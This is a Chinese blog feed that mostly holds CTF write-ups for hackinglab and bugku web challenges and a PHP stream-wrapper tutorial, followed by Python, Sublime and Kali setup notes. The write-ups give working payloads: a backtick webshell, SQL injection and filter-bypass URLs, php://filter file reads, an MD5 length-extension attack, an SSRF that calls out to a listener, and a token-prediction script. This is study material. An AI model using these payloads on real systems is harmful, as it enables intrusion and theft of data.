Attack!，md5长度扩展攻击，先看看代码，可以知道的是已知md5，已知salt的长度，还知道/etc/hosts,这里给出工具下载链接使用方法：1234567891011$ hashpump -hHashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength] HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack. -h --help Display this message. -t --test Run tests to verify each algorithm is operating properly. -s --signature The signature from known message. -d --data The data from the known message. -a --additional The information you would like to add to the known message. -k --keylength The length in bytes of the key being used to sign the original message with. Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support. &lt;Developed by bwall(@botnet_hunter)&gt; 安装方法1234git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmake install 这里我们知道的是signature、data、keylength,需要读取的文件这里写成_flag.php所以工具使用： 1hashpump -s f3d366138601b5afefbd4fc15731692e -d /etc/hosts -k 32 -a /etc/_flag.php 提交时需要把\x换成%，因为是URL编码的最终的payload是：1http://lab1.xseclab.com/decrypt1_53a52adb49c55c8daa5c8ee0ff59befe/md5_le.php?filepath=/etc/hosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00/etc/_flag.php&amp;sign=7fbbac6efeb7939be04829bc9a847f0c 美丽的邂逅与密码器的开门密码这题题目给的一个exe文件，名字还是reverse,逆向题，IDA打开之后找到主函数 可以看到当v19等于1的时候才会输出一段字符，找到401005函数，1234int __cdecl sub_401005(char *a1)&#123; return sub_401020(a1);&#125; 又跳到了401020,12345678910BOOL __cdecl sub_401020(char *a1)&#123; char v2; // [sp+Ch] [bp-44h]@1 int v3; // [sp+4Ch] [bp-4h]@1 memset(&amp;v2, 0xCCu, 0x44u); v3 = 0; v3 = strlen(a1); return v3 &gt; 50;&#125; 可以看出来当v20的长度大于50就能返回true，也就是1运行程序，输入任意字符，长度大于50: 得到key 综合关渗透测试第一期这题先把每个页面POST的变量抓个包看看，在尝试了几次之后，发现几个问题 注册时用户名不能使用admin 在绑定手机页面出现了username这个变量 绑不绑定手机效果都一样 在忘记密码页面，需要跟用户名与之绑定的手机号才能得到验证码 这题就有了大概的思路，需要登录进admin账户，但是不知道密码，爆破试了之后发现不少弱口令，所以需要重置密码，重置密码时需要手机号，但是当将username等于admin之后，发现: 所以需要将admin用户的手机号绑定为已知的手机号，刚好在绑定手机页面username可以更改， 回到忘记密码页面，Username填写admin，正常发送即可重置密码 再用重置的密码登陆即可得到key 没有注入到底能不能绕过登录首先题目提示了不是SQL注入，并且题目里没有什么有用的提示，所以只能先扫一下后台，发现robots.txt 12User-agent: *Disallow: /myadminroot/ 访问一下myadminroot，但是提示Please login first!所以现在找办法登陆，但是我用burpsuite抓包时发现，在登陆页面go一次之后，在其他页面访问myadminroot就能得到key所以发现了在弹出error时，不点击确认就不会将已经登陆的状态取消，估计就是session的原因，直接得到key 美图闪亮亮交友平台题目直接给了12Tips: 邮箱没有xss漏洞Tips: 管理员用的是手机wap邮箱,而且管理员的手机不支持Cookie(20150823) 邮箱没有XSS，但是在题目中的input框中还是存在XSS，管理员也没有cookie，所以没办法使用管理员的cookie登陆进后台，在网上找了也没有writeup，最终看到了出题人给的提示1题目采用curl模拟方式来模拟管理员审核的过程。 估计是SSRF先说下解题思路，在姓名和照片描述处都没有做要求，但是在图片URL处对内容做了要求，必须是网址，但是抓包发送的话可以绕过js， 并且在&lt;img&gt;处没有过滤，可以正常弹窗，代码1http://www.hackinglab.cn/meitu.jpg11&quot; onerror=&quot;alert(1) 一开始看起来像存储型XSS但是题目给了提示，并不是XSS所以只能换一种思路，在看了出题人给的提示之后，看到了curl SSRF 漏洞出现的场景： 能够对外发起网络请求的地方，就可能存在 SSRF 漏洞 从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed） 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB） Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP） 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML） 猜测是管理员用curl命令访问了图片URL,这里采用nc来获取信息:服务器端，监听一个端口（确保这个端口是开着的）1nc -l 8888 图片URL:1http://你的服务器IP:8888 再发送即可， 此时在自己的服务器上可以看到一个请求 访问这个URL即可得到key 最简单的数字取证1这题可以直接用软件DiskGenius，网上一搜一大把，是一个用来分区的软件，打开软件，在上方的磁盘-&gt;打开虚拟磁盘文件-&gt;选择下载下来的文件即可,之后打开磁盘可以直接看到key 最简单的数字取证2方法与上题一样，不过key文件在RECYLER里的一个文件中的De1.txt里 小明学习代码审计一个代码审计题，打开题目查看源代码可以发现一个resetpwd.php的页面，打开之后是一个提交的input框，右键查看源代码:12345678910111213141516171819&lt;?php session_start();include &apos;_flag.php&apos;;date_default_timezone_set(&apos;Asia/Shanghai&apos;);if(isset($_POST[&apos;token&apos;]) &amp;&amp; isset($_SESSION[&apos;token&apos;]) &amp;&amp;!empty($_POST[&apos;token&apos;])&amp;&amp;!empty($_SESSION[&apos;token&apos;]))&#123; if($_POST[&apos;token&apos;]==$_SESSION[&apos;token&apos;])&#123; echo &quot;PassResetSuccess! Your Flag is:&quot;.$flag; &#125;else&#123; echo &quot;Token_error!&quot;; &#125;&#125;else&#123; mt_srand(time()); $rand= mt_rand(); $_SESSION[&apos;token&apos;]=sha1(md5($rand)); echo &quot;Token Generate Ok! now send email to your EmailBox!.....&quot;; if(sendmymail($_SESSION[&apos;token&apos;]))&#123; echo &quot;SendOK! \r\n&lt;br&gt; Your password reset Token has been send to your mailbox! &lt;br&gt;Please Check your mail box and fill your token here to reset your password!&lt;br&gt;&quot;; &#125;;&#125; 先说说代码什么意思，首先我们能控制的变量是token，并且需要与$_SESSION[&#39;token&#39;]相等,而$_SESSION[&#39;token&#39;]，是被加密过的，而且这个加密看起来不能绕过，因为有随机数$rand，所以这个时候需要了解一下伪随机数这个概念了，先来看看php的mt_srand()和mt_rand()，mt_srand():12用 seed 来给随机数发生器播种。 没有设定 seed 参数时，会被设为随时数。Note: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。 mt_rand():1生成更好的随机数 简单来说就是首先用mt_srand()播种，然后mt_rand()以这个seed随机生成数据，但是我们可以发现，当seed一样时，mt_rand生成的数据顺序是一样的，测试代码：12345678&lt;?php $seed=10; mt_srand($seed); for ($i=0; $i &lt; 10; $i++) &#123; $rand= mt_rand(); echo $rand.&quot;&lt;br&gt;&quot;; &#125; ?&gt; 当指定的seed为固定时，产生的随机数顺序一样，所以不管上面的测试代码怎么刷新，得到的值总是一样12345678910502355954641584702211262118810740890731360749216120791137454651988317865160461082451610903986200 回到这一题，这题的seed是time()，当前时间戳，一样的道理，我们首先在本地获取到当前的时间戳，并且以这个时间戳为seed，然后产生随机数即可与服务器上的$_SESSION[&#39;token&#39;]相同,这里采用php+python,php用来获取随机数，python用来发送php代码： 1234567&lt;?php //rand.phpdate_default_timezone_set(&apos;Asia/Shanghai&apos;);mt_srand(time());$rand= mt_rand();$hax = sha1(md5($rand));echo $hax;?&gt; python代码: 12345678910import requestslocal = requests.session()a = requests.session()url = &quot;http://127.0.0.1/rand.php&quot;r = local.get(url)hax = r.texturl2 = &quot;http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php&quot;x = a.get(url2)x = a.post(url2,data=&#123;&apos;token&apos;: hax&#125;)print (x.text) 由于延迟，可能会有几次失败，多试几次即可运行py脚本得到key: HackingLab首台rootkit题目虚拟机[公测]先放上题目的提示:1234567要求: 找到系统rootkit后门(不是木马)并提取后门密码密码验证方式:验证可以远程获取root权限,则说明密码正确.正确的密码即为过关密码 虚拟机信息:[root密码hackinglab.cn] 下载地址: http://pan.baidu.com/s/1bnoKlOj 密码: bpe5若无法下载请联系@CplusHua该题目可能难度较大，涉及到应急响应分析，病毒木马查杀，简单逆向分析等 先正常的将虚拟机下载下来并导入，配置好网络之后正常连接 首先网站的目录里什么都没有，看一下以root权限的进程 1ps -u root 可以看到进程里有一个httpd进程，但是httpd是不需要root权限的，先查看一下apache加载了哪些模块:123456[root@rootkit modules]# apachectl -lCompiled in modules: core.c prefork.c http_core.c mod_so.c 都是正常的，所以现在去找一下apache的目录下查看modules目录 12345678910111213[root@rootkit modules]# cd /etc/httpd/modules/[root@rootkit modules]# lslibphp5.so mod_authn_file.so mod_cgid.so mod_ext_filter.so mod_mime.so mod_rootme22.somod_actions.so mod_authnz_ldap.so mod_cgi.so mod_filter.so mod_negotiation.so mod_setenvif.somod_alias.so mod_authz_dbm.so mod_dav_fs.so mod_headers.so mod_proxy_ajp.so mod_speling.somod_asis.so mod_authz_default.so mod_dav.so mod_ident.so mod_proxy_balancer.so mod_status.somod_auth_basic.so mod_authz_groupfile.so mod_dbd.so mod_include.so mod_proxy_connect.so mod_substitute.somod_auth_digest.so mod_authz_host.so mod_deflate.so mod_info.so mod_proxy_ftp.so mod_suexec.somod_authn_alias.so mod_authz_owner.so mod_dir.so mod_ldap.so mod_proxy_http.so mod_unique_id.somod_authn_anon.so mod_authz_user.so mod_disk_cache.so mod_log_config.so mod_proxy_scgi.so mod_userdir.somod_authn_dbd.so mod_autoindex.so mod_dumpio.so mod_log_forensic.so mod_proxy.so mod_usertrack.somod_authn_dbm.so mod_cache.so mod_env.so mod_logio.so mod_reqtimeout.so mod_version.somod_authn_default.so mod_cern_meta.so mod_expires.so mod_mime_magic.so mod_rewrite.so mod_vhost_alias.so 发现一个一个mod_rootme22.so很奇怪 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556[root@rootkit modules]# strings mod_rootme22.so __gmon_start___init_fini__cxa_finalize_Jv_RegisterClassespidlistpipe_Apipe_Bshell_spoolerttynamepipeforkgetppidexitwaitpidwriteselectreadkillcloserunshell_rawrunshell_ptyprocess_clientstrncmpshutdownsendrecvsetsiddup2execlpopenptymemsetioctlmallocstrncpyputenvchdircore_moduleap_get_module_configstrcmpap_hook_post_configap_hook_post_read_requestrootme22_modulelibutil.so.1libc.so.6_edata__bss_start_endGLIBC_2.2.5ATSubH/usr/sbin/apache2 -k starthackinglabwelcomeyou!wearefriends+mod_rootme22.c22PA 得到flag 代码审计与综合利用跟前一题一样，把环境搭好之后访问: 一开始题目没给什么提示，查看源代码可以看到需要提交src这个参数，可以看到源代码：12345678910111213141516171819&lt;?phpsession_start();$savepath=&quot;files/&quot;.sha1(session_id()).&quot;/&quot;;if(!is_dir($savepath))&#123; $oldmask=umask(0); mkdir($savepath,0777); umask($oldmask); touch($savepath.&quot;/index.html&quot;);&#125;if(($_POST[&apos;filename&apos;])&amp;&amp;($_POST[&apos;content&apos;]))&#123; $fp=fopen(&quot;$savepath&quot;.$_POST[&apos;filename&apos;],&apos;w&apos;); fwrite($fp,substr($_POST[&apos;content&apos;],0,7)); fclose($fp); $msg=&apos;File saved to &lt;a&gt;&apos;.$savepath.htmlspecialchars($_POST[&apos;filename&apos;]).&quot;&lt;/a&gt;&quot;; echo $msg;&#125;?&gt;&lt;?php if(@$_GET[&apos;src&apos;]) show_source(__FILE__);?&gt;&lt;!-- &lt;a href=&quot;./?src=&quot;&gt;src&lt;/a&gt;--&gt; 一道代码审计题，第一个if是用来创建文件的，先不用管，主要是第二个if这题估计是一个上传shell的题，首先上传的内容只能是7个字符，多了写不进去，代码： 1&lt;?=`*`; php这样写完之后，会把当前目录下的所有文件都执行一遍，利用这个特性，可以写入一遍历目录的命令，随后POST1filename=hh.php&amp;content=&lt;?=`*`; 此时这个木马已经上传上去了,回显:1File saved to files/6a9c5c89231381902ed84c8bebec2b0a7db1defe/hh.php 再上传:1filename=hh&amp;content=ls / 和1filename=bash&amp;content=ls / 此时可以看到 再将hh的内容改为1filename=hh&amp;content=cat /t* 执行得到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php伪协议学习]]></title>
    <url>%2F2018%2F07%2F12%2Fphpagree%2F</url>
    <content type="text"><![CDATA[php支持的协议和封装的协议: 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 CTF中主要出现的是php://,zlib,data,phar,所以文章主要研究的是这四种，其他的只是简单的学习一下。 file://、http://&amp;https、ftp://&amp;ftps://、glob://file://文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码1234&lt;?php include($_REQUEST[&apos;s&apos;]); var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=file:///绝对路径\1.php 此时回显的是hello,world，这里有个小问题，1.php中的echo执行了，但是2.php中却是空的，这是因为已经被解析了，查看源代码即可看到。 http://&amp;https://允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。 HTTP 请求会附带一个 Host: 头，用于兼容基于域名的虚拟主机。 如果在你的 php.ini 文件中或字节流上下文（context）配置了 user_agent 字符串，它也会被包含在请求之中。1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码123&lt;?php var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=http://127.0.0.1/phpagree/1.php 此时回显的是hello,world，并且就是http://127.0.0.1/phpagree/1.php的内容 ftp://&amp;ftps://允许通过 FTP 读取存在的文件，以及创建新文件。 如果服务器不支持被动（passive）模式的 FTP，连接会失败。由于暂时没有搭建ftp的服务器，所以暂时无法演示。 glob://查找匹配的文件路径模式1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码12345678910&lt;?php// 循环 ext/spl/examples/ 目录里所有 *.php 文件// 并打印文件名和文件尺寸$it = new DirectoryIterator($_REQUEST[&apos;s&apos;]);foreach($it as $f) &#123; printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);&#125;?&gt; 结果如下 php://、data://、zlib://、phar://php://PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 首先要确保，在php.ini中allow_url_include设置为On,因为allow_url_include依赖于allow_url_fopen，所以allow_url_fopen也需要开启。 php://input访问请求的原始数据的只读流，可以接收到post的数据，但是当enctype=”multipart/form-data” 的时，php://input无效 1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码1234&lt;?php include($_GET[&apos;s&apos;]); var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=php://input 并且POST1.php此时回显: 可以看到1.php直接被当成了一个字符串，并没有解析。但是当POST&lt;?php echo &#39;hello,world&#39;; ?&gt;时，直接就解析了： 因为php://input相当于直接包含了&lt;?php echo &#39;hello,world&#39;; ?&gt;，并且解析，类似于include。 php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。 2.php代码12345&lt;?php $output = fopen($_REQUEST[&apos;s&apos;],&apos;w&apos;); fwrite($output, &quot;hello,world&quot;); fclose($output);?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=php://output 此时回显: php://filter是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 参数:1234resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 1.php代码1234&lt;?php $hello = &apos;hello,world&apos;; echo $hello;?&gt; 2.php代码1234&lt;?php include($_REQUEST[&apos;s&apos;]); //var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 此时的回显是: base64解码之后就是1.php的内容了 再来看一下bugku上题的payload1URL?file=php://filter//read=convert.base64-encode/resource=index.php 比如这个payload中read=convert.base64-encode，resource=index.php，过滤器还有很多种，这里给出官方文档CTF中用的最多的还是convert.base64-encode，其他的了解一下就好。还有一个小问题，为什么include的时候没有解析，因为经过base64编码后，不会被直接解析。 data://数据（RFC 2397）用法data://text/plain;base64, 2.php代码1234&lt;?php include($_REQUEST[&apos;s&apos;]); //var_dump(file_get_contents($_REQUEST[&apos;s&apos;]));?&gt; 访问1http://127.0.0.1/phpagree/2.php?s=data://text/plain;base64,PD9waHANCgkkaGVsbG8gPSAnaGVsbG8sd29ybGQnOw0KCWVjaG8gJGhlbGxvOw0KPz4= 即可得到hello,world,因为PD9waHANCgkkaGVsbG8gPSAnaGVsbG8sd29ybGQnOw0KCWVjaG8gJGhlbGxvOw0KPz4=base64解码之后就是1.php的内容，include包含之后就解析成功了。 来看hackinglab一道题的payload:1URL?^.^=data://text/plain;charset=unicode,(●&apos;◡&apos;●) wp不仔细说，用法data:[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt; zlib://&amp;phar://zlib://压缩流用法zip://archive.zip#dir/file.txt phar://PHP 归档用法类似于zlib://，这两种主要是用于getshell，本地不方便做实验，所以就不用演示了。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sublime分别配置python2&3编译环境]]></title>
    <url>%2F2018%2F07%2F09%2Fsublimepy%2F</url>
    <content type="text"><![CDATA[新建sublime-build文件在上方菜单栏打开工具(T)-&gt;编译系统(U)-&gt;新编译系统，此时会出来一个文件： 将以下代码覆盖上去即可123&#123; &quot;cmd&quot;: [&quot;这里写python安装的目录/python.exe&quot;, &quot;-u&quot;, &quot;$file&quot;]&#125; 因为我配置的是python27的环境，所以保存的文件名写上python27.sublime-build，python3也类似，保存即可。此时在编译环境下可以看到python27了(sublime在编译环境中有一个预存的python，它的环境配置是默认在cmd中输入python的编译环境，我这里输入python是python3的环境，所以添加python2的环境) 编译新建一个py文件，输入12print &apos;hello&apos; 测试，ctrl+b快捷编译 编译成功，可以使用了]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>sublime</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下python2&3环境变量及pip2&3冲突设置]]></title>
    <url>%2F2018%2F07%2F09%2Fpython23%2F</url>
    <content type="text"><![CDATA[1.安装Python这一步比较简单，去官网上下载安装就行了，下载链接 2.配置环境变量右键我的电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量在Path栏双击，点击新建，将Python2&amp;3的安装目录分别添加进去，这里均适用默认目录: 此时在cmd输入Python，如果有效的话，证明环境变量已经设置好了。若想输入python2&amp;3分别出现python2和python3的话，将安装目录下的python.exe更改为python2或3即可。 3.解决pip2&amp;3问题若出现unable to create process using &#39;&quot;&#39;，可能是pip版本过低输入1python36 -m pip install -U pip 即可若还是不行，将python3安装目录下的Scripts/pip.exe删除后就能正常使用]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Linux中如何安装Google Chrome并安装插件]]></title>
    <url>%2F2018%2F06%2F24%2Fkali-google%2F</url>
    <content type="text"><![CDATA[因为一些原因，需要在Windows下Centos的VMware虚拟机中kali的KVM虚拟机中安装Google浏览器，做个笔记 安装Google Chrome使用wget命令下载Google Chrome的debian安装包在shell中输入：1wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb 下载完之后我们准备安装,输入1dpkg -i google-chrome-stable_current_amd64.deb 但是此时会出现依赖问题： 输入以下命令后解决 1apt-get -f install 选择 y 解决完依赖问题后即可正常安装，运行 1google-chrome 会提示： 没有–no-sandbox 不支持root用户使用，虽然可以在后面加上–no-sandbox的命令，但是一般我们使用google浏览器是在GUI界面上使的。所以这里再介绍GUI界面如何解决： 首先在/usr/share/applications找到Google-Chrome然后右键图标-&gt;文件属性-&gt;桌面项-&gt;命令 在stable后面加上 1--no-sandbox --user-data-dir&amp; 注意空格,然后点击确认即可。 Kali中Google-Chrome安装插件可以直接在Kali中的Google-Chrome下载插件，但是需要挂梯子，因为我不会在kali里科学上网，所以只能导入安装包了。 首先需要得到安装包，而得到安装包的方法一般有两种： 从网上下载安装包 从Windows上的Google Chrome中导出安装包 这里建议从Windows上导出，因为网上下载的.crx文件部分不能用。 从Windows上的Google Chrome中导出安装包：首先你的电脑肯定需要挂梯子，不会的可以点此学习ssr的搭建然后登录google账户，在应用商店里下载插件。 下载完需要的插件之后点击浏览器右上方的菜单-&gt;更多工具-&gt;扩展程序。 点击打包扩展程序，会让你输入目录，我们先点击取消 点击所需要安装插件的详细信息，可以看到有个ID值： 需要从浏览器安装的插件目录中找到这个ID值,插件安装的位置一般是默认在 1C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Extensions 其中user是你电脑的用户名，找到文件夹之后，打开文件夹，里面有个版本的文件夹，继续打开直到: 此时将文件夹路径复制下来输入到刚刚填写的目录中，再点击打包扩展程序即可。 此时会出来扩展程序和秘钥文件： 我们需要的是.crx文件，将路径记下来，打开xftp连接kali进行文件传输 将文件传进去即可。 然后进入kali的GUI界面打开Google浏览器，打开扩展程序页面： 将刚刚的.crx文件拖进去即可完成安装]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku writeup(Web1）]]></title>
    <url>%2F2018%2F06%2F06%2Fbugku%2F</url>
    <content type="text"><![CDATA[Web(1)web2滑稽，F12查看源，得到flag： 文件上传测试题目提示：请上传PHP文件，文件上传大小不允许超过1M试了几次之后，当上传php文件时提示非图片文件，上传图片时，提示非php文件，打开burpsuite，将一个php文件的后缀加上.jpg，上传时将.jpg删掉再上传即可 计算器题目给出的输入框限制了最大输入长度，F12将最大长度限制删掉就行. web基础$_GET这题有基础的都知道怎么做：代码：1234$what=$_GET[&apos;what&apos;];echo $what;if($what==&apos;flag&apos;)echo &apos;flag&#123;****&#125;&apos;; 将what提交了就行 web基础$_POST跟上题一样: 矛盾代码：1234567$num=$_GET[&apos;num&apos;];if(!is_numeric($num))&#123;echo $num;if($num==1)echo &apos;flag&#123;**********&#125;&apos;;&#125; 代码意思是当num不是个数字并且值等于1的时候输出flag：payload:URL?num=1x31提交拿到flag web3打开的时候阻止页面创建对话框 查看源码，在最底下有串代码 html码得到flag附上解码连接 sql注入这题是宽字节注入：原理：12345678910GBK 占用两字节ASCII占用一字节PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。大家都知道%df’ 被PHP转义，单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。 payload:1http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23 首先，在url栏输入：1http://103.238.227.13:10083/?id=%df%27 报错了,说明可以注入 继续查看可显字段和库名：1http://103.238.227.13:10083/?id=%df%27 union select 1,database()%23 告诉你查询key表里id=1的字段：1http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23 得到flag 域名解析hint：听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag直接改host就行，这里用火狐一个插件直接改访问的host就行 直接拿到flag SQL注入1过滤代码：1234567891011121314//过滤sql$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit(&apos;包含敏感关键字！&apos;.$value); &#125;&#125;//xss过滤$id = strip_tags($id);$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;; 注入的关键词几乎都过滤了，但是看到后面有个xss过滤。查资料发现strip_tags（）函数会去除字符串里的html和php标签，思路是先在payload里插入html标签绕过sql的过滤，然后再用xss的过滤去除html的标签： 想通之后很简单，就是常规的sql注入,得到数据库名：1http://103.238.227.13:10087/?id=-1%20uni%3C%3Eon%20sel%3C%3Eect%201,databa%3C%3Ese()%23 payload:1http://103.238.227.13:10087/?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key %23 查找表为key的数据表，id=1值hash字段值，得到flag 你必须让他停下这题是不停的刷新页面，用burpsuite抓包就行：多go几次就能拿到flag： 本地包含括号闭合的思路，payload：1http://120.24.86.145:8003/index.php?hello= 1);print_r(file(&quot;./flag.php&quot;) 在服务器上执行的代码是(var_dump(hello=1);print_r(file(“./flag.php”));//得到flag：flag{bug-ctf-gg-99} 反括号`在linux下起着命令替换的作用。命令替换是指shell能够将一个命令的标准输出插在一个命令行中任何位置。如下：12[root@localhost sh]# echo The date is `date` The date is 2011年 03月 14日 星期一 21:15:43 CST 单引号、双引号用于用户把带有空格的字符串赋值给变量事的分界符。如果没有单引号或双引号，shell会把空格后的字符串解释为命令。单引号和双引号的区别。单引号告诉shell忽略所有特殊字符，而双引号忽略大多数，但不包括$、\、`。例子：1234[root@localhost tmp]# echo ‘the date is `date`’ the date is `date` [root@localhost tmp]# echo “the date is `date`” the date is Fri Oct 9 00:11:56 CST 2015 eval( “var_dump($a);”);正是双引号！！！我们就可以用`了！然后用cat读取输出即可！ 变量1某春秋原题。flag In the variable !payload:1http://120.24.86.145:8004/index1.php?args=GLOBALS 参考资料 web5jsfuck右键查看源代码： 复制下来，F12放到控制台回车，得到flag： 头等舱看这个名字就感觉flag在响应头里：F12查看一下响应头，得到flag 网站被黑首先题目没有给什么提示，也没有.bak`robots等东西，所以直接上御剑扫描， 然后扫到了一个shell.php，进去发现是一个大马，但是没有地方给密码，试了几个密码不行之后发现不行，没有验证码，直接爆破，出来之后发现密码是hack`，直接得到flag web4题目提示查看源代码， 进行了URL编码，p1解码：1function checkSubmit()&#123;var a%3ddocument.getElementById(&quot;password&quot;)%3bif(&quot;undefined&quot;!%3dtypeof a)&#123;if(&quot;67d709b2b p2解码：1aa648cf6e87a7114f1&quot;%3d%3da.value)return!0%3balert(&quot;Error&quot;)%3ba.focus()%3breturn!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit%3dcheckSubmit%3b 大概意思就是提交的值与p1里面那段值加上54aa2再加上p2里的值相同就行拼接起来提交就行： flag在index里点进去，看看URL 一个文件包含的题，直接拿php伪协议试：payload:1http://120.24.86.145:8005/post/index.php?file=php://filter//read=convert.base64-encode/resource=index.php base64解码之后得到flag：flag{edulcni_elif_lacol_si_siht} 输入密码查看flag输入5位数密码，直接爆破 得到flag 点击一百万次查看源代码: 当clicks大于1000000时，能拿到flagF12控制台输入clicks=100000000000回车即可得到flag 备份是个好习惯备份文件获取，将index.php.bak下载下来，查看源码：12345678910111213include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);$str = substr($str,1);$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.&quot;取得flag&quot;;&#125;?&gt; php弱类型比较，在url栏输入： URL?key1=QNKCDZO&amp;key2=240610708 发现没啥反应，然后看了看源码，发现过滤了key双写key绕过，提交得到flagpayload:1http://120.24.86.145:8002/web16/index.php?kekeyy1=QNKCDZO&amp;kkeyey2=240610708 秋名山老司机直接访问： 很明显是算不到这么快的。只能写脚本了。附上python脚本：12345678910import requestsimport reurl = &apos;http://120.24.86.145:8002/qiumingshan/&apos;s = requests.Session()source = s.get(url)expression = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;, source.text).group()result = eval(expression)post = &#123;&apos;value&apos;: result&#125;print(s.post(url, data = post).text) 这里有个正则匹配来匹配给出的表达式，然后直接用eval计算。最后将value post即可得到flag，但是计算出的表达式长度不一样，可能会超过php的最大长度所以需要多试几遍。 速度要快打开来什么都没有，就是一个你得快点： 查看源代码：1&lt;!-- OK ,now you have to post the margin what you find --&gt; 有一段提示，post margin变量what i find打开bp抓包： 响应头中有个flag,base64之后：1跑的还不错，给你flag吧: NjM4NzUy 估计是把 NjM4NzUy提交上去就行了,但是后面发现还得把NjM4NzUy解一次base64：638752这个后面再说原因。直接上python脚本：1234567891011import requestsimport base64import reurl=&apos;http://120.24.86.145:8002/web6/&apos;a=requests.session()r=a.get(url)FLAG=r.headers[&apos;flag&apos;]p=re.match(&apos;(.*)(: )(.*)&apos;,base64.b64decode(FLAG))payload=&#123;&apos;margin&apos;:base64.b64decode(p.group(3))&#125;r=a.post(url,data=payload)print(r.text) 得到flag: 